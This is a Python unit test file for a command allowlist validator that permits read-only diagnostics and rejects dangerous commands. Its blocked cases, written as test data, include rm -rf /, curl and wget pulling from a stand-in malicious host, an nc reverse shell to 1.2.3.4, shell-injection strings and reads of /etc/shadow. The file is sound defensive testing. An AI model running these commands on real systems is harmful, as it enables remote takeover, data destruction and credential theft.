"""Unit tests for hardcoded command allowlist validator."""

from backend.app.core.allowlist import validate_command


def test_allowed_commands() -> None:
    """Test that allowed base commands with valid arguments pass validation."""
    valid_cases = [
        ("ps", ["aux"]),
        ("df", ["-h"]),
        ("free", ["-m"]),
        ("systemctl", ["status", "nginx"]),
        ("journalctl", ["-u", "nginx", "--no-pager", "-n", "50"]),
        ("cat", ["/proc/meminfo"]),
        ("cat", ["/etc/resolv.conf"]),
        ("du", ["-sh", "/var/log"]),
        ("ls", ["-lah", "/tmp"]),
        ("ping", ["-c", "4", "google.com"]),
        ("ss", ["-tlnp"]),
        ("dig", ["google.com"]),
    ]

    for cmd, args in valid_cases:
        allowed, reason = validate_command(cmd, args)
        assert allowed is True, f"Expected '{cmd} {' '.join(args)}' to be allowed, but rejected: {reason}"


def test_blocked_commands() -> None:
    """Test that dangerous and destructive commands are strictly rejected."""
    blocked_cases = [
        ("rm", ["-rf", "/"]),
        ("kill", ["-9", "1234"]),
        ("pkill", ["nginx"]),
        ("reboot", []),
        ("shutdown", ["now"]),
        ("chmod", ["777", "/etc/passwd"]),
        ("chown", ["root:root", "/tmp"]),
        ("curl", ["http://malicious.site/script.sh"]),
        ("wget", ["http://malicious.site/malware"]),
        ("nc", ["-e", "/bin/sh", "1.2.3.4", "4444"]),
        ("bash", ["-c", "echo hack"]),
        ("sudo", ["su"]),
    ]

    for cmd, args in blocked_cases:
        allowed, reason = validate_command(cmd, args)
        assert allowed is False, f"Expected '{cmd}' to be blocked, but allowed!"
        assert len(reason) > 0


def test_shell_injection_prevention() -> None:
    """Test that commands containing shell operators are blocked."""
    injection_cases = [
        ("ps", ["aux;", "rm", "-rf", "/"]),
        ("df", ["-h", "&&", "reboot"]),
        ("free", ["-m", "|", "grep", "Mem"]),
        ("cat", ["/etc/resolv.conf", "`id`"]),
        ("ping", ["127.0.0.1", "$(whoami)"]),
    ]

    for cmd, args in injection_cases:
        allowed, reason = validate_command(cmd, args)
        assert allowed is False, f"Expected injection '{cmd} {' '.join(args)}' to be blocked!"
        assert "illegal shell operator" in reason.lower()


def test_unrestricted_cat_path_rejection() -> None:
    """Test that cat to arbitrary sensitive files outside restricted paths is rejected."""
    allowed, reason = validate_command("cat", ["/etc/shadow"])
    assert allowed is False
    assert "restricted path" in reason.lower()


def test_modifying_systemctl_operation_is_rejected() -> None:
    """Read-only systemctl access must not permit service state changes."""
    allowed, _ = validate_command("systemctl", ["restart", "nginx"])
    assert allowed is False


def test_modifying_ip_operation_is_rejected() -> None:
    """Read-only network inspection must not permit link changes."""
    blocked_cases = [
        ["link", "set", "eth0", "down"],
        ["addr", "flush", "dev", "eth0"],
        ["route", "flush", "table", "main"],
        ["route", "replace", "default", "via", "10.0.0.1"],
        ["route", "add", "default", "via", "10.0.0.1"],
        ["route", "del", "default"],
    ]

    for args in blocked_cases:
        allowed, _ = validate_command("ip", args)
        assert allowed is False


def test_read_only_ip_shapes_are_allowed() -> None:
    """Read-only ip inspection commands stay available for diagnostics."""
    allowed, reason = validate_command("ip", ["addr", "show"])
    assert allowed is True, reason

    allowed, reason = validate_command("ip", ["route", "show"])
    assert allowed is True, reason


def test_relative_path_traversal_is_rejected() -> None:
    """Restricted file tools must not escape their explicit path boundary."""
    allowed, _ = validate_command("cat", ["../../etc/shadow"])
    assert allowed is False
